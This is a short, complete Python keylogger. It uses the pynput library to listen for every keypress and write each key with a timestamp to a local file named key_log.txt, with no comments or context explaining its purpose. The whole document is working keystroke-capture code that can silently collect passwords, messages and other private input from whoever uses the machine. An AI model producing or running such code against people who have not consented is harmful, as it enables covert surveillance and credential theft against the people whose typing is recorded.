from pynput import keyboard
import logging

logz = ""

logging.basicConfig(filename=(logz + 'key_log.txt'), format='%(asctime)s: %(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

# Collect events until released

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
